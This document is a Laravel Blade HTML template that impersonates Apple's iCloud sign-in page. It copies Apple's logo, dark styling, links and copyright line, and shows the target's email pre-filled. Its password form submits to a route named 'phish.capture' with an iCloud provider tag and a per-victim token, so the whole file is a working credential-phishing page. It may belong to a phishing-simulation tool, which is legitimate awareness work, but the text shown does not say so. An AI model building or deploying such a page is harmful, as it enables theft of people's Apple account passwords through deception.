<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title>Sign in to iCloud</title>
    <link rel="icon" href="https://apple.com/favicon.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'SF Pro Display','Helvetica Neue',sans-serif;background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:#1c1c1e;border-radius:20px;padding:48px 40px;width:100%;max-width:400px;text-align:center}
        .apple-logo{margin-bottom:20px}
        .apple-logo svg{width:40px;height:48px;fill:#f5f5f7}
        h1{font-size:28px;font-weight:700;color:#f5f5f7;margin-bottom:8px;letter-spacing:-0.3px}
        .sub{font-size:15px;color:#86868b;margin-bottom:32px;line-height:1.4}
        .email-display{display:flex;align-items:center;padding:12px 16px;background:#2c2c2e;border-radius:12px;margin-bottom:24px}
        .email-display .icon{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#5ac8fa,#007aff);display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:600;margin-right:12px;flex-shrink:0}
        .email-display .text{font-size:14px;color:#f5f5f7;font-weight:500;text-align:left}
        .form-group{text-align:left;margin-bottom:16px;position:relative}
        .form-group label{display:block;font-size:13px;color:#86868b;margin-bottom:6px;font-weight:600}
        .form-group input{width:100%;height:48px;padding:0 16px;font-size:17px;color:#f5f5f7;background:#2c2c2e;border:1px solid #38383a;border-radius:12px;outline:none;transition:border-color .2s;font-family:-apple-system,sans-serif}
        .form-group input:focus{border-color:#007aff}
        .form-group input::placeholder{color:#636366}
        .btn-login{width:100%;height:50px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;margin-top:8px;transition:background .15s;font-family:-apple-system,sans-serif}
        .btn-login:hover{background:#0063d1}
        .btn-login:active{background:#0050b3}
        .links{margin-top:20px;display:flex;flex-direction:column;gap:12px;align-items:center}
        .links a{font-size:14px;color:#0a84ff;text-decoration:none}
        .links a:hover{text-decoration:underline}
        .divider{display:flex;align-items:center;margin:24px 0;width:100%}
        .divider::before,.divider::after{content:'';flex:1;height:1px;background:#38383a}
        .divider span{padding:0 16px;font-size:13px;color:#86868b}
        .social-btns{display:flex;justify-content:center;gap:16px;margin-top:4px}
        .social-btn{width:48px;height:48px;border-radius:50%;border:1px solid #38383a;background:transparent;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background .15s}
        .social-btn:hover{background:#2c2c2e}
        .social-btn svg{width:20px;height:20px;fill:#f5f5f7}
        .footer{margin-top:24px;font-size:12px;color:#636366}
        .footer a{color:#636366;text-decoration:none;margin:0 8px}
        .footer a:hover{text-decoration:underline}
        @media(max-width:480px){.card{padding:32px 24px}}
    </style>
</head>
<body>
    <div class="card">
        <div class="apple-logo">
            <svg viewBox="0 0 170 170" xmlns="http://www.w3.org/2000/svg">
                <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.53 3.24-12.8 3.35-4.93.21-9.84-1.96-14.74-6.52-3.13-2.73-7.05-7.41-11.76-14.04-5.05-7.1-9.2-15.34-12.45-24.73-3.5-10.12-5.25-19.94-5.25-29.45 0-10.87 2.35-20.25 7.06-28.11 3.71-6.3 8.64-11.27 14.83-14.9 6.19-3.64 12.88-5.49 20.1-5.67 3.92 0 9.06 1.21 15.44 3.61 6.36 2.41 10.44 3.63 12.23 3.63 1.34 0 5.87-1.43 13.57-4.27 7.28-2.64 13.44-3.74 18.49-3.3 13.66 1.1 23.94 6.48 30.78 16.17-12.25 7.43-18.3 17.83-18.14 31.17.14 10.34 3.87 18.94 11.15 25.78 3.31 3.17 7.02 5.62 11.14 7.36-.9 2.61-1.85 5.11-2.86 7.51zM119.11 7.24c0 8.12-2.96 15.67-8.86 22.64-7.12 8.32-15.74 13.14-25.08 12.38-.12-.97-.19-1.99-.19-3.07 0-7.8 3.39-16.17 9.39-23.08 3-3.52 6.82-6.45 11.45-8.79 4.62-2.32 8.99-3.6 13.1-3.74.12 1.08.19 2.14.19 3.26z"/>
            </svg>
        </div>

        <h1>Sign in to iCloud</h1>
        <p class="sub">Use your Apple Account to sign in to iCloud.</p>

        <div class="email-display">
            <div class="icon">{{ strtoupper(substr($email, 0, 1)) }}</div>
            <div class="text">{{ $email }}</div>
        </div>

        <form action="{{ route('phish.capture', ['provider' => 'icloud', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required autofocus>
            </div>

            <button type="submit" class="btn-login">Sign In</button>
        </form>

        <div class="links">
            <a href="#">Forgot password?</a>
            <a href="#">Create Your Apple Account</a>
        </div>

        <div class="divider"><span>or</span></div>

        <div class="social-btns">
            <button class="social-btn">
                <svg viewBox="0 0 24 24"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>
            </button>
            <button class="social-btn">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z" fill="#f5f5f7"/></svg>
            </button>
        </div>

        <div class="footer">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <div style="margin-top:8px">Copyright © 2026 Apple Inc.</div>
        </div>
    </div>
</body>
</html>
